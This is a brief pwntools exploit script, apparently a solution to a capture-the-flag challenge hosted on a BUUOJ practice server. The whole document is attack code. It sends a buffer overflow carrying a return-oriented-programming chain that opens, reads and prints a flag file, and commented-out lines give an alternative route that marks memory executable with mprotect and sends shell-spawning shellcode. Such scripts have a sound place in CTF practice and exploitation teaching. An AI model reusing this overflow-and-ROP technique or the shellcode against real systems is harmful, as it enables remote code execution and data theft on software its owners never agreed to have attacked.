from pwn import *

io=remote('node3.buuoj.cn', 26518)
#io=process('./pwn')
#mprotect=0x806EC80 
pop3_ret=0x809e4c5
pop2_ret=0x806fc31
bss=0x80EC000 
read=0x806E140
op=0x806E0D0 
write=0x806E1B0
flag=0x80BC388

#pl='a'*0x38+p32(mprotect)+p32(pop3_ret)+p32(bss)+p32(0x1000)+p32(7)
#pl+=p32(read)+p32(bss)+p32(0)+p32(bss)+p32(0x100)
pl='a'*0x38+p32(op)+p32(pop2_ret)+p32(flag)+p32(0)
pl+=p32(read)+p32(pop3_ret)+p32(3)+p32(bss)+p32(64)
pl+=p32(write)+'dead'+p32(1)+p32(bss)+p32(64)

io.sendline(pl)

#shellcode=asm(shellcraft.sh())
#io.sendline(shellcode)

io.interactive()